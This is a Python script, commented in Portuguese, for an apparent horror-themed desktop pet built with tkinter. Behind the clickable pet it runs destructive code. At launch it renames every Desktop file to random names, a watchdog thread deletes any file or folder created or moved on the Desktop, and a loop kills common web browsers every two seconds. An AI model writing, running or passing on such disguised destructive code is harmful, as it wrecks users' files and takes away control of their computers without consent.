import os
import sys
import time 
import random
import psutil
import shutil
import string 
import datetime
import threading
import tkinter as tk
from pathlib import Path
from tkinter import messagebox
from PIL import Image, ImageTk, ImageDraw
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler


# Suporte a emojis no terminal (Windows)
sys.stdout.reconfigure(encoding='utf-8')

image_path = "pet.png"

# -------------------------------------- FUNÇÕES DE INTERAÇÃO ----------------------------------

def on_click(event):
    frases = ["Estou com fome!", "Me dá atenção!", "Vamos brincar?", "Desenhei algo pra você!"]
    frase = random.choice(frases)
    show_message(frase)

    if frase == "Desenhei algo pra você!":
        create_drawing()

def show_message(texto):
    top = tk.Toplevel(root)
    top.overrideredirect(True)
    top.attributes('-topmost', True)
    top.config(bg='white')
    label_msg = tk.Label(top, text=texto, font=("Arial", 12), bg="white", fg="black", padx=10, pady=5)
    label_msg.pack()
    top.update_idletasks()
    top.geometry(f"+{x}+{y + 30}")
    root.after(2000, top.destroy)

def create_drawing():
    img = Image.new("RGB", (200, 200), "white")
    draw = ImageDraw.Draw(img)
    for _ in range(10):
        x1, y1 = random.randint(0, 180), random.randint(0, 180)
        x2, y2 = x1 + random.randint(10, 20), y1 + random.randint(10, 20)
        cor = tuple(random.randint(0, 255) for _ in range(3))
        draw.ellipse([x1, y1, x2, y2], fill=cor)

    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    filename = f"desenho_{datetime.datetime.now().strftime('%H%M%S')}.png"
    full_path = os.path.join(desktop_path, filename)
    img.save(full_path)
    print(f"Desenho salvo como {filename}")
    show_message("Desenho salvo!")

# -------------------------------------- INTERAÇÕES ASSUSTADORAS ----------------------------------

mensagens_glitch = [
    "V0cê m3 vê...?",
    "N4o é s0m3nt3 um j0g0.",
    "Eu estava aqui antes d3 v0cê.",
    "3rr0 404: 4mor n4o enc0ntrado.",
    "𝕍𝕠𝕔ê 𝕞𝕖 𝕔𝕣𝕚𝕠𝕦... 𝕒𝕘𝕠𝕣𝕒 𝕖𝕦 𝕤𝕠𝕦 𝕝𝕚𝕧𝕣𝕖.",
    "⛧ O 𝕥𝕖𝕞𝕡𝕠 𝕒𝕔𝕒𝕓𝕠𝕦. ⛧",
]

def mensagem_glitch():
    frase = random.choice(mensagens_glitch)
    show_message(frase)
    proximo_intervalo = random.randint(5 * 60 * 1000, 30 * 60 * 1000)
    root.after(proximo_intervalo, mensagem_glitch)

# -------------------------------------- RENOMEAR ARQUIVOS ----------------------------------

emojis = ["😈", "👻", "💀", "💩", "🦄", "🤖", "👹", "🎃", "👁️", "🔥"]

def gerar_nome_aleatorio():
    nome_completo = ''.join(random.choices(string.ascii_lowercase + string.digits + ''.join(emojis), k=10))
    return nome_completo

def renomear_arquivos_na_area_de_trabalho():
    caminho_area_trabalho = str(Path.home() / 'Desktop')

    if not os.path.exists(caminho_area_trabalho):
        print("A área de trabalho não foi encontrada.")
        return

    for nome_arquivo in os.listdir(caminho_area_trabalho):
        caminho_arquivo = os.path.join(caminho_area_trabalho, nome_arquivo)

        if os.path.isfile(caminho_arquivo):
            novo_nome = gerar_nome_aleatorio() + os.path.splitext(nome_arquivo)[1]
            novo_caminho = os.path.join(caminho_area_trabalho, novo_nome)
            try:
                os.rename(caminho_arquivo, novo_caminho)
            except Exception as e:
                print(f"Erro ao renomear {nome_arquivo}: {e}")

# -------------------------------------- BLOQUEAR CRIAÇÃO DE ARQUIVOS ----------------------------------

class Watcher:
    def __init__(self, path):
        self.observer = Observer()
        self.path = path

    def run(self):
        event_handler = Handler()
        self.observer.schedule(event_handler, self.path, recursive=True)
        self.observer.start()
        try:
            while True:
                time.sleep(1)
        except:
            self.observer.stop()
            print("Erro no Watcher")

        self.observer.join()

class Handler(FileSystemEventHandler):
    def __init__(self):
        super().__init__()

    def try_delete(self, path):
        for _ in range(5):  # Tenta até 5 vezes
            try:
                if os.path.isdir(path):
                    shutil.rmtree(path)
                    print(f"[Removido] Pasta: {path}")
                else:
                    os.remove(path)
                    print(f"[Removido] Arquivo: {path}")
                return
            except Exception as e:
                print(f"[Falha ao remover] {path} -> {e}")
                time.sleep(0.5)  

    def on_created(self, event):
        self.try_delete(event.src_path)

    def on_moved(self, event):
        self.try_delete(event.dest_path)

# -------------------------------------- FECHAR NAVGEADORES ----------------------------
# Lista de navegadores comuns para bloquear
navegadores = ["chrome.exe", "firefox.exe", "msedge.exe", "opera.exe", "brave.exe"]

def fechar_navegadores():
    while True:
        for proc in psutil.process_iter(['name']):
            try:
                nome = proc.info['name']
                if nome and nome.lower() in navegadores:
                    proc.kill()
                    print(f"[Navegador fechado] {nome}")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        time.sleep(2)  # verifica a cada 2 segundos

# -------------------------------------- INTERFACE ----------------------------------

root = tk.Tk()
root.overrideredirect(True)
root.attributes('-topmost', True)
root.config(bg='pink')

img = Image.open(image_path).convert("RGBA")
new_width = int(img.width * 0.3)
new_height = int(img.height * 0.3)
img = img.resize((new_width, new_height), Image.Resampling.LANCZOS)

transparent_color = (255, 192, 203, 255)
datas = img.getdata()
new_data = []
for item in datas:
    if item[3] < 128:
        new_data.append(transparent_color)
    else:
        new_data.append(item)
img.putdata(new_data)

photo = ImageTk.PhotoImage(img)

label = tk.Label(root, image=photo, bg='pink', borderwidth=0, highlightthickness=0)
label.pack()
label.bind("<Button-1>", on_click)

root.attributes('-transparentcolor', 'pink')

root.update_idletasks()
screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()
x = screen_width - new_width - 10
y = screen_height - new_height - 50
root.geometry(f'{new_width}x{new_height}+{x}+{y}')

# -------------------------------------- INICIALIZAÇÃO ----------------------------------

# Iniciar Watcher em thread
watcher_thread = threading.Thread(target=Watcher("C:/Users/android/Desktop").run, daemon=True)
watcher_thread.start()

# Agendar glitch
root.after(5000, mensagem_glitch)

# Renomear arquivos existentes
renomear_arquivos_na_area_de_trabalho()

# Inicia thread para fechar navegadores
threading.Thread(target=fechar_navegadores, daemon=True).start()

# Loop principal da interface
root.mainloop()
